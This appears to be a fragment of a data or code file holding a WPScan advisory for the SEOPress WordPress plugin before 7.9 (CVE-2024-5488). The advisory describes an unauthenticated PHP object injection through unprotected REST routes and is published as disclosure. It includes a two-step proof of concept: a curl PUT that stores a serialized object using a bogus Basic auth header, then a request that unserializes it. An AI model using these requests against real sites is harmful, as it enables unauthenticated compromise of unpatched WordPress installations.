Description
\t\t\tThe plugin does not properly protect some of its REST API routes, which combined with another Object Injection vulnerability can allow unauthenticated attackers to unserialize malicious gadget chains, compromising the site if a suitable chain is present."""
full_description = '''WordPress Plugin Vulnerabilities SEOPress < 7.9 - Unauthenticated Object Injection Description The plugin does not properly protect some of its REST API routes, which combined with another Object Injection vulnerability can allow unauthenticated attackers to unserialize malicious gadget chains, compromising the site if a suitable chain is present. Proof of Concept 1) To save the gadget chain. Replace $POSTID and "superadmin" with a published post ID and the site administrator's username: curl -X PUT --url 'http://vulnerable-site.tld/wp-json/seopress/v1/posts/$POSTID/title-description-metas' --data 'title=O:8:"StdClass":0:{};' -H 'Authorization: Basic '`echo -n 'superadmin:invalidpassword' | base64` 2) Access http://vulnerable-site.tld/wp-json/seopress/v1/posts/$POSTID/content-analysis to unserialize the malicious gadget chain. Affects Plugins wp-seopress Fixed in 7.9 References CVE CVE-2024-5488 URL https://wpscan.com/blog/object-injection-vulnerability-fixed-in-seopress-7-9/ Classification Type OBJECT INJECTION OWASP top 10 A8: Insecure Deserialization CWE CWE-502 CVSS 8.1 (high) Miscellaneous Original Researcher Marc Montpas Submitter Marc Montpas Submitter website https://wpscan.com Submitter twitter marcS0H Verified Yes WPVDB ID 28507376-ded0-4e1a-b2fc-2182895aa14c Timeline Publicly Published 2024-06-18 (about 7 months ago) Added 2024-06-18 (about 7 months ago) Last Updated 2024-06-25 (about 7 months ago) Other Published Title Published 2023-01-02 Title Google Analyticator < 6.5.6 - Admin+ PHP Object Injection Published 2024-04-29 Title Grid Gallery < 1.4.4 - Contributor+ PHP Object Injection via shortcode Published 2024-11-12 Title Advanced Order Export For WooCommerce < 3.5.6 - Unauthenticated PHP Object Injection via Order Details Published 2023-11-15 Title Welcart e-Commerce < 2.9.6 - Admin+ PHP Object Injection Published 2023-09-25 Title NextGEN Gallery < 3.39 - Admin+ PHAR Deserialization'''
